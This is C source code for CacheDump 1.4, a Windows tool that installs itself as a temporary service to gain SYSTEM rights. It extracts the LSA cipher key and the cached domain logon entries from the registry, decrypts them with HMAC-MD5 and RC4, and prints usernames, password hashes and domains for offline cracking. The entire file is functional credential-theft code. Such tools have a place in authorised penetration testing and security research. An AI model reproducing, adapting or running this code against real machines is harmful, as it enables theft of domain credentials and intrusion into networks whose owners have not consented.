/*
 *  Copyright (C) 2008 fizzgig and the foofus.net Team
 *  With special thanks to Richie B for recent patches!
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 2 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software
 *  Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
 */

/**
 * Special Thanks to:
 * Simon Marechal whithout him cacheDump wouldn't exist and for the John The Ripper
 * module
 * Chistophe Devine for md5/rc4 implementation and technical skills.
 *
 *
 * CacheDump will create a CacheDump NT Service to get SYSTEM right and make
 * his stuff on the registry. Then, it will retrieve the LSA Cipher Key to decrypt
 * (rc4/hmac_md5 GloubiBoulga) cache entries values.
 *
 * A John The Ripper module has been developped to attack the hashed values that
 * are retrieved ( timing equivalent to MD4( MD4( password|U(username) ) ).
 */
#include <windows.h>

#include "initguid.h"

#include <stdio.h>
#include <stdlib.h>
#include <ctype.h>

#include "md5.h"
#include "rc4.h"
#include "cachedump.h"

#pragma comment(lib, "Advapi32.lib" )

CACHE_CHUNK CacheEntries[ MAX_CACHE_ENTRIES ];
BYTE * LSACipherKey;

char ErrorBuffer[ BUFFER_SIZE ];
extern DWORD ErrorSize;
extern TCHAR* SERVICE_NAME;
extern void WINAPI ServiceMain( DWORD , LPTSTR*);

static VOID HandleError( CHAR * mess )
{
	FormatMessage( FORMAT_MESSAGE_FROM_SYSTEM, NULL, GetLastError(),
 	   0, ErrorBuffer, ErrorSize, NULL );
	printf( ERROR_MESSAGE, mess, GetLastError() );
}

static VOID RunService()
{
	SERVICE_TABLE_ENTRY serviceTable[] = 
	 { { SERVICE_NAME, ServiceMain }, { NULL, NULL } };

	StartServiceCtrlDispatcher( serviceTable );
}

static DWORD SetCacheEntries( DWORD index, const BYTE * data, DWORD size )
{
	if ( index < 1 || index > MAX_CACHE_ENTRIES || size == 0 ) {
		printf( "Invalid Cache entries number. Shouldn't happen.\n" );
		ExitProcess( 2 );
	}

	if ( ( CacheEntries[ index ].data = (BYTE*)HeapAlloc( GetProcessHeap(), HEAP_ZERO_MEMORY, size ) ) == NULL ) {
		HandleError( "Failed to alloc a Heap.\n" );
		ExitProcess( 3 );
	}

	CacheEntries[ index ].size = size;

	memcpy( CacheEntries[ index ].data, data, size );
	return 0;
}

static DWORD SetLsaCipherKey( const BYTE * lsaKey, DWORD size )
{
	if ( size != 64 ) {
		HandleError( "Invalid LSA key...\n" );
		return 1;
	}

	LSACipherKey = (BYTE*)HeapAlloc( GetProcessHeap(), HEAP_ZERO_MEMORY, 64 );

	memcpy( LSACipherKey, lsaKey, 64 );
	return 0;
}

static VOID DumpByte( BYTE * data, DWORD size, LPCTSTR format )
{
	DWORD i;
	for( i = 0 ; i < size ; i++ ) {
		printf( format, data[ i ] );
	}
}

static VOID DumpUByte( BYTE * data, DWORD size, LPCTSTR format )
{
	DWORD i;
	for( i = 0 ; i < size ; i = i + 2 ) {
		printf( format, data[ i ] );
	}
}

/**
 * Microsoft MSV 1.4 main algorithm to decipher cache entries.
 */
static DWORD DumpCache( VOID )
{
	DWORD i;
	HANDLE heapCache;

	heapCache = ( HANDLE ) HeapCreate( 0, 0, 0 );
	if ( heapCache == NULL ) {
		HandleError( "HeapCreate\n" );
		heapCache = GetProcessHeap();
	}
	
	for ( i = 0 ; i < MAX_CACHE_ENTRIES ; i++ ) {
		CACHE_CHUNK ce = CacheEntries[ i ];
		if ( ce.size != 0 ) {
			DWORD lUsername = ce.data[ 0 ]; //unicode
			DWORD lDomain = ce.data[ 2 ];
			DWORD lDomainName = ce.data[ 60 ];
//			DWORD lScript = ce.data[ 8 ];
//			DWORD lHome = ce.data[ 12 ];

            if ( lUsername != 0 ) { // empty entries
				md5_context md5Ctx;
				struct rc4_state rc4State;
				DWORD i;
				BYTE digest[ 16 ];
                BYTE k_ipad[ 64 ], k_opad[ 64 ];
				BYTE key1[ 64 ];
				BYTE key2[ 64 ];
				BYTE * username, * domain, * domainName;
				int msJoke[ 2 ];

				// HMAC md5 is the key
				memset( k_ipad, 0x36, 64 );
				memset( k_opad, 0x5c, 64 );
				for ( i = 0 ; i < 64 ; i++ ) {
					key1[ i ] = LSACipherKey[ i ] ^ k_ipad[ i ];
					key2[ i ] = LSACipherKey[ i ] ^ k_opad[ i ];
				}

				md5_starts( &md5Ctx );
				md5_update( &md5Ctx, key1, 64 );
				md5_update( &md5Ctx, ce.data + 64, 16 );
				md5_finish( &md5Ctx, digest );

				md5_starts( &md5Ctx );
				md5_update( &md5Ctx, key2, 64 );
				md5_update( &md5Ctx, digest, 16 );
				md5_finish( &md5Ctx, digest );
		
				// RC4 Cipher
  				rc4_setup( &rc4State, digest, 16 );
				rc4_crypt( &rc4State, ce.data + 96, ce.size - 96 );
				
				username = ( BYTE * ) HeapAlloc( heapCache, HEAP_ZERO_MEMORY,
					lUsername + 1 );
				memset( username, 0, lUsername + 1 );
				for ( i = 0 ; i < lUsername ; i++ ) {
					username[ i ] = tolower( ce.data[ 168 + i ] );
				}

				DumpUByte( username, lUsername, "%c" );
				printf( ":" );
				DumpByte( ce.data + 96, 16, "%.2X" );
				printf( ":" );
	
				msJoke[ 0 ] = 2 * ( ( lUsername / 2 ) % 2 );

				domain = ( BYTE * ) HeapAlloc( heapCache, HEAP_ZERO_MEMORY,
					lDomain + 1 );
				for ( i = 0 ; i < lDomain ; i++ ) {
					domain[ i ] = tolower( ce.data[ 168 + lUsername + 
						msJoke[ 0 ] + i ] );
				}
				DumpUByte( domain, lDomain, "%c" );
				printf( ":" );

				msJoke[ 1 ] = 2 * ( ( lDomain / 2 ) % 2 );

				domainName = ( BYTE * ) HeapAlloc( heapCache, HEAP_ZERO_MEMORY,
					lDomainName + 1 );
				for ( i = 0 ; i < lDomainName ; i++ ) {
					domainName[ i ] = tolower( ce.data[ 168 + lUsername + msJoke[ 0 ] +
						lDomain + msJoke[ 1 ] + i ] );
				}
				DumpUByte( domainName, lDomainName, "%c" );
				printf( "\n" );

				// free nothing :)
	  }
	 }
	}

return 0;
}


VOID usage( )
{
	printf( "CacheDump 1.4 - Dump Cache Entries\n" );
	printf( "cacheDump [-v | -vv | -K]\n-v\tVerbose\n-vv\tVery verbose\n" );
	printf( "-K\tKill CacheDump service (shouldn't be used)" );

	ExitProcess( 0 );
}

VOID CacheOpenManager( SC_HANDLE * scm )
{
	*scm = OpenSCManager( 0, 0, SC_MANAGER_CREATE_SERVICE );
	if ( ! (*scm) ) {
		HandleError( "OpenSCManager function failed\n" );
		ExitProcess( 5 );
	}
}

void main(DWORD argc, CHAR *argv[])
{
#define VERBOSE( code ) do { if ( verbose ) { code } } while( 0 )
#define VVERBOSE( code ) do { if ( vverbose ) {code } } while( 0 )
	SC_HANDLE myService, scm;
	BOOL success;
	HANDLE hPiped;
	SERVICE_STATUS status;
	TCHAR path[ ( _MAX_PATH + 1 ) + 3 ];
	BYTE buffer[ BUFFER_SIZE ];
	DWORD nbRead;
	DWORD i, verbose = 0, vverbose = 0, retry = 0;
	WCHAR wszGUID[CHARS_IN_GUID + 1];
	char szPipeName[MAX_PATH + 1];
	GUID guidPipe;
	const char* varg[1];

	if ( argc == 2 ) {
		if ( !strncmp( argv[ 1 ], "-vv", 3 ) ) {
			verbose = vverbose = 1;
		} else if ( !strncmp( argv[ 1 ], "-v", 2 ) ) {
			verbose = 1;
		} else if ( !strncmp( argv[ 1 ], "-s", 2 ) ) {
			// -s flag don't be used
			RunService();
			return;
		} else if ( !strncmp( argv[ 1 ], "-K", 2 ) ) {
			CacheOpenManager( &scm );
            myService = OpenService(scm, SERVICE_NAME, SERVICE_ALL_ACCESS | DELETE);
			if (!myService) {
				printf( "No CacheDump service found !\n" );
				ExitProcess( 0 );
			}
			printf( "Try to kill CacheDump service.\n" );
			goto stop;
		} else {
			usage( );
		}
	} else if ( argc > 2 ) {
		usage( );
	}

	CacheOpenManager( &scm );
 
	// Check if service already exist or create it.
	myService = OpenService(scm, SERVICE_NAME, SERVICE_ALL_ACCESS | DELETE);
	if (!myService) {
		if ( GetLastError() == 1060 ) 
		{
			strcpy_s(path, 1, "\"");
			GetModuleFileName(0, path + sizeof(path[0]), (sizeof(path) - sizeof(path[0])) / sizeof(path[0]));
			strcat_s(path, 4, "\" -s");
			VERBOSE( printf( "Service not found. Installing CacheDump Service (%s)\n", path ); );
		}
		myService = CreateService( scm, SERVICE_NAME, SERVICE_NAME,	SERVICE_ALL_ACCESS,
					 SERVICE_WIN32_OWN_PROCESS, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, 
                     path, 0, 0, 0, 0, 0);
		if (!myService)	{
			HandleError( "CreateService function failed\n" );
			goto stop;
		} else {
			VERBOSE( printf( "CacheDump service successfully installed.\n" ); );
		}
	} else {
		// OpenService Fails
		HandleError("OpenService function failed\n" );
		goto stop;
	}

	// Need to create a guid for the pipe name
	memset(wszGUID, 0, CHARS_IN_GUID + 1);
	memset(szPipeName, 0, MAX_PATH + 1);

	CoCreateGuid(&guidPipe);
	StringFromGUID2(guidPipe, wszGUID, CHARS_IN_GUID);
	wsprintf(szPipeName, "\\\\.\\pipe\\%ls", wszGUID);

	hPiped = CreateNamedPipe(szPipeName, PIPE_ACCESS_INBOUND, PIPE_TYPE_BYTE | PIPE_WAIT,
				2, BUFFER_SIZE, BUFFER_SIZE , CD_TIMEOUT, NULL );
	if ( hPiped == INVALID_HANDLE_VALUE ) {
		HandleError( "CreateNamedPipe function failed. Dumping cache do not seems to work.\n" );
		goto stop;
	}

	VVERBOSE( printf( "Pipe %s created.\n", szPipeName ); );

    varg[0] = szPipeName;

	if ( !StartService( myService, 1, varg ) ) {
		int ret = GetLastError();
		if ( ret == ERROR_SERVICE_ALREADY_RUNNING ) {
			printf( "Service already running. Shouldn't happen. try -K flag.\n" );
			goto stop2;
		} else {
			HandleError("StartService function failed\n"
				"Are you Administrator? Is cacheDump executed from a local drive? "
				"Service still runnning?\n" );
			goto stop2;
		}
	} else {
		VERBOSE( printf( "Service started.\n" ); );
	}

	//printf( "Attach debugger now.\n" );
	//scanf("...");

	if ( !ConnectNamedPipe( hPiped, NULL ) ) {
		HandleError( "ConnectNamedPipe function failed.\n" );
		goto stop2;
	}

	VVERBOSE( printf("Pipe connected.\n"); );

	i = 1;
	while( 1 ) {
		if ( !ReadFile( hPiped, buffer, BUFFER_SIZE * sizeof( TCHAR ),
				&nbRead, NULL ) ) {
			if ( GetLastError() == ERROR_BROKEN_PIPE ) {
				break;
			}
			// notice it ?
			break;
		}

		if ( nbRead > 5 ) {
			if ( !strncmp( (char*)buffer, "ERROR", 5 ) ) {
				buffer[ nbRead ] = '\0';
				printf( "%s\n", buffer );
				i = -1;
				goto stop3;
			} else if ( !strncmp( (char*)buffer, "NLK", 3 ) ) {
				VVERBOSE( printf("NL$%d(%d): ", i, nbRead - 3 );
  					DumpByte( buffer + 3, nbRead - 3, "%2X " );
					printf( "\n" ); );
				// Should not exceed MAX_CACHE_ENTRIES
				SetCacheEntries( i, buffer + 3, nbRead - 3);
			} else if ( !strncmp( (char*)buffer, "LSA", 3 ) ) {
				VVERBOSE( printf( "LSA Key: " ); \
					DumpByte( buffer + 3, nbRead - 3, "%2X " ); \
					printf( "\n" ); );
				SetLsaCipherKey( buffer + 3, nbRead - 3 );
			}
		}
	i++;
	}

	DumpCache();

stop3:
	DisconnectNamedPipe( hPiped );
stop2:
	CloseHandle( hPiped );
stop:
	// Stop the service if necessary
	success = QueryServiceStatus(myService, &status);
	if ( !success ) {	
		HandleError("QueryServiceStatus failed\n" );
	}

	if (status.dwCurrentState == SERVICE_RUNNING) {
		VERBOSE( printf( "Service currently active.  Stopping service...\n" ); );
		success = ControlService(myService, SERVICE_CONTROL_STOP, &status);
		if ( !success ) {
			if ( retry ) {
				VERBOSE( printf( "Can't stop the service. Try to remove it.\n" ); );
			} else {
				VERBOSE( printf( "ControlService failed to STOP the service.\n" ); 
				printf( "Retry in 2 sec\n"); );
				retry = 1;
				Sleep( 2000 );
				goto stop;
			}
		}
	}

	if ( DeleteService( myService ) ) {
		VERBOSE( printf( "Service successfully removed.\n" ); );
	} else {
		HandleError("DeleteService failed. Is the service running?\n" );
	}
   
	CloseServiceHandle(myService);
	CloseServiceHandle(scm);
}
